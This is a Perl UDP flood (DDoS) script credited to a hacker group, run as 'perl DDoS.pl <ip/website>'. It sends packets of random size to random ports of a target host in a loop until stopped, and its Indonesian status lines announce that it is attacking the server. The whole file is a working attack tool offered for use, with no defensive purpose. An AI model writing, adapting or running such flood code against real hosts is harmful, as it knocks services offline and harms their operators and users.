################################################################################
#  __  __                              __  __      _       _ _  __  __          
#  \ \/ /_ __  _   ___   _____ _ __ ___\ \/ /_ __ | | ___ (_) |_\ \/ /___ _ __  
#   \  /| '_ \| | | \ \ / / _ \ '__/ __|\  /| '_ \| |/ _ \| | __|\  // _ \ '_ \ 
#   /  \| | | | |_| |\ V /  __/ |  \__ \/  \| |_) | | (_) | | |_ /  \  __/ | | |
#  /_/\_\_| |_|\__,_| \_/ \___|_|  |___/_/\_\ .__/|_|\___/|_|\__/_/\_\___|_| |_|
#                                           |_|                                 
################################################################################
######################################
#                                    #
# termux = perl DDoS.pl <ip/website> #
#                                    #
######################################

use Socket;
use strict;
use Getopt::Long;
use Time::HiRes qw( usleep gettimeofday ) ;

our $port = 0;
our $size = 0;
our $time = 0;
our $bw   = 0;
our $help = 0;
our $delay= 0;

GetOptions(
	"port=i" => \$port,
	"size=i" => \$size,
	"bandwidth=i" => \$bw,
	"time=i" => \$time,
	"delay=f"=> \$delay,
	"help|?" => \$help);
	

my ($ip) = @ARGV;

if ($help || !$ip) {
  print <<'EOL';
 The usage of command is perl cqHack.pl a.b.c.d
EOL
  exit(1);
}

if ($bw && $delay) {
  print "WARNING: The package size overrides the parameter --the command will be ignored\n";
  $size = int($bw * $delay / 8);
} elsif ($bw) {
  $delay = (8 * $size) / $bw;
}

$size = 700 if $bw && !$size;

($bw = int($size / $delay * 8)) if ($delay && $size);

my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cant resolve the hostname try again $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

printf "[0;32m>> Made by XnuversXploitXen from TangerangCyber  \n";
printf "[0;32m>>
__  __                               
\ \/ /_ __  _   ___   _____ _ __ ___ 
 \  /| '_ \| | | \ \ / / _ \ '__/ __|
 /  \| | | | |_| |\ V /  __/ |  \__ \
/_/\_\_| |_|\__,_| \_/ \___|_|  |___/
                                     \n";
  
printf "[0;31m>> hitting the ip    \n";
printf "[0;36m>> hitting the ports     \n";
printf "[0;36m>> Sedang Menyerang     \n";
printf "[0;36m>> mengirim 1,5gb ke situs server yang dituju     \n";

($size ? "$size-byte" : "") . " " . ($time ? "" : "") . "\033[1;32m\033[0m\n\n";
print "Interpacket delay $delay msec\n" if $delay;
print "total IP bandwidth $bw kbps\n" if $bw;
printf "[1;31m>> Press CTRL+C to stop the attack  \n" unless $time;

die "Invalid package size: $size\n" if $size && ($size < 64 || $size > 1500);
$size -= 28 if $size;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
  usleep(1000 * $delay) if $delay;
}
